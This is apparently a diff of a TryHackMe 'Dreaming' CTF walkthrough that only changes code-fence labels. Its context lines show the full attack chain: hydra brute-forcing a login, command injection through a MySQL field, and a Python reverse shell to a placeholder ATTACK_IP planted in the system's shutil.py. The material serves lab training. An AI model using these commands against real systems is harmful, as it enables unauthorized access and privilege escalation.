@@ -22,7 +22,7 @@ media_subpath: /assets/img/thm/dreaming/
 
 In any TryHackMe challenge room, we can use Rustscan/Nmap to check the ports on the Dreaming machine.
 
-```terminal
+```bash
 Command: rustscan -a TARGET_IP -- -A
 
 PORT   STATE SERVICE REASON         VERSION
@@ -52,7 +52,7 @@ Let's check the HTTP (port 80) website.
 
 Hmm, seems like there is nothing on the default page and on the page source. Let's use dirsearch to search for directories (directory enumeration).
 
-```terminal
+```bash
 Command: dirsearch -u TARGET_IP
 
   _|. _ _  _  _  _ _|_    v0.4.3
@@ -111,7 +111,7 @@ Seems like the creator stopped any LFI attempts from working. So, as I always sa
 
 ### Enumeration
 
-```terminal
+```bash
 Command: dirsearch -u TARGET_IP/app/pluck-4.7.13/
   _|. _ _  _  _  _ _|_    v0.4.3
  (_||| _) (/_(_|| (_| )
@@ -168,7 +168,7 @@ Doesn't seem like it contains much information that we don't know already.
 
 Ahhhh, we have a login page! We only need a password and no username. We can use hydra to brute force the login. This part: `cont1=^PASS^&bogus=&submit=Log+in` was captured using Caido (you can also use Burp Suite, Zap, etc.).
 
-```terminal
+```bash
 Command: hydra -l dummy -f -P /usr/share/wordlists/rockyou.txt TARGET_IP http-post-form "/app/pluck-4.7.13/login.php:cont1=^PASS^&bogus=&submit=Log+in:F=Password incorrect" -vv
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-07-17 17:14:13
@@ -209,7 +209,7 @@ We got a shell!
 
 Let's look for any files that seem important.
 
-```terminal
+```bash
 $ python3 -c "import pty;pty.spawn('/bin/bash')"
 www-data@ip-10-10-REDACTED:/$ cd /home/lucien
 cd /home/lucien
@@ -238,7 +238,7 @@ drwx------ 2 lucien lucien 4096 Jul 28  2023 .ssh
 
 We can't read anything important in Lucien's home folder. Let's keep looking.
 
-```terminal
+```bash
 www-data@ip-10-10-REDACTED:/home/lucien$ cd /opt
 cd /opt
 www-data@ip-10-10-REDACTED:/opt$ ls -la
@@ -252,7 +252,7 @@ drwxr-xr-x 20 root   root   4096 Jul 17 07:21 ..
 
 We have two python scripts in the `/opt` directory.
 
-```terminal
+```bash
 www-data@ip-10-10-REDACTED:/opt$ cat getDreams.py
 cat getDreams.py
 import mysql.connector
@@ -313,7 +313,7 @@ getDreams()
 
 Death's password seems to be redacted from this file.
 
-```terminal
+```bash
 www-data@ip-10-10-REDACTED:/opt$ cat test.py
 cat test.py
 import requests
@@ -339,7 +339,7 @@ else:
 
 It seems like the password for Lucien is not redacted! Let's try sshing into Lucien using this password!
 
-```terminal
+```bash
 Command: ssh lucien@TARGET_IP
 
 The authenticity of host '10.10.REDACTED (10.10.REDACTED)' can't be established.
@@ -423,7 +423,7 @@ THM{REDACTED}
 
 Let's check .bash_history for Lucien.
 
-```terminal
+```bash
 lucien@ip-10-10-REDACTED:~$ ls -la
 total 44
 drwxr-xr-x 5 lucien lucien 4096 Aug 25  2023 .
@@ -512,7 +512,7 @@ su root
 
 We got a mysql password and username, although it doesn't seem like we can use it for now. Let's check sudo -l.
 
-```terminal
+```bash
 lucien@ip-10-10-REDACTED:/opt$ sudo -l
 Matching Defaults entries for lucien on ip-10-10-REDACTED:
     env_reset, mail_badpass,
@@ -524,7 +524,7 @@ User lucien may run the following commands on ip-10-10-REDACTED:
 
 It seems like we can run `/usr/bin/python3` as Death for `/home/death/getDreams.py`.
 
-```terminal
+```bash
 lucien@ip-10-10-REDACTED:/opt$ sudo -u death /usr/bin/python3 /home/death/getDreams.py
 Alice + Flying in the sky
 
@@ -537,7 +537,7 @@ Dave + Becoming a professional musician
 
 When running the command, it looks like an output for a `getDreams.py` we found last time.
 
-```terminal
+```bash
 lucien@ip-10-10-REDACTED:/opt$ cat getDreams.py
 import mysql.connector
 import subprocess
@@ -597,7 +597,7 @@ getDreams()
 
 It seems like the code is running a command echo with the "dreamer" and the "dream". Let's see if that has to do with mysql.
 
-```terminal
+```bash
 lucien@ip-10-10-REDACTED:/opt$ mysql -u lucien -p
 Enter password: 
 Welcome to the MySQL monitor.  Commands end with ; or \g.
@@ -651,7 +651,7 @@ mysql> select * from dreams;
 
 Seems like the mysql IS connected to the `getDreams.py` file we found. We can actually set dream to `; /bin/bash -p` so that when the `getDreams.py` file is executed, we become Death.
 
-```terminal
+```bash
 mysql> show tables;
 +-------------------+
 | Tables_in_library |
@@ -703,7 +703,7 @@ death@ip-10-10-REDACTED:~$ cat /home/death/getDreams.py
 
 Hmm, none of the commands we execute are working. Let's try to use mysql to get Death's password from `/home/death/getDreams.py`.
 
-```terminal
+```bash
 lucien@ip-10-10-REDACTED:/opt$ mysql -u lucien -p
 Enter password: 
 Welcome to the MySQL monitor.  Commands end with ; or \g.
@@ -814,7 +814,7 @@ Dave + Becoming a professional musician
 
 We got Death's password! Let's ssh.
 
-```terminal
+```bash
 Command: ssh death@TARGET_IP      
 
                                   {} {}
@@ -886,7 +886,7 @@ death@ip-10-10-REDACTED:~$
 
 We are now Death!
 
-```terminal
+```bash
 death@ip-10-10-REDACTED:~$ cd /home/death
 death@ip-10-10-REDACTED:~$ ls -la
 total 56
@@ -913,7 +913,7 @@ We got Death's flag!
 
 When moving around and looking, it seemed like we have access to Morpheus's home folder.
 
-```terminal
+```bash
 death@ip-10-10-REDACTED:~$ cd /home/morpheus
 death@ip-10-10-REDACTED:/home/morpheus$ ls -la
 total 44
@@ -932,7 +932,7 @@ drwxrwxr-x 3 morpheus morpheus 4096 Jul 28  2023 .local
 
 We see a readable `restore.py` file.
 
-```terminal
+```bash
 death@ip-10-10-REDACTED:/home/morpheus$ cat restore.py
 from shutil import copy2 as backup
 
@@ -945,7 +945,7 @@ print("The kingdom backup has been done!")
 
 It seems like the folder `/home/morpheus/kingdom` is being backed up to `/kingdom_backup/kingdom`. It's possible that this file is being run once every few minutes, and it seems like it is using backup from the shutil library. Let's find that shutil file on the system.
 
-```terminal
+```bash
 death@ip-10-10-REDACTED:/home/morpheus$ find / -name "shutil*" 2>/dev/null
 /usr/lib/python3.8/shutil.py
 /usr/lib/python3.8/__pycache__/shutil.cpython-38.pyc
@@ -960,14 +960,14 @@ death@ip-10-10-REDACTED:/home/morpheus$ ls -la /usr/lib/python3.8/shutil.py
 
 With the `/usr/lib/python3.8/shutil.py` file, we can edit it so that it runs a command for us to get a reverse shell from Morpheus.
 
-```terminal
+```bash
 death@ip-10-10-REDACTED:/home/morpheus$ nano /usr/lib/python3.8/shutil.py
 Add: import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACK_IP",ATTACK_PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")
 ```
 
 Set up a netcat listener.
 
-```terminal
+```bash
 Command: nc -lnvp ATTACK_PORT                                    
 listening on [any] 4444 ...
 connect to [10.REDACTED] from (UNKNOWN) [10.10.REDACTED] 43366
@@ -976,7 +976,7 @@ $
 
 We are now Morpheus!
 
-```terminal
+```bash
 $ whoami
 whoami
 morpheus
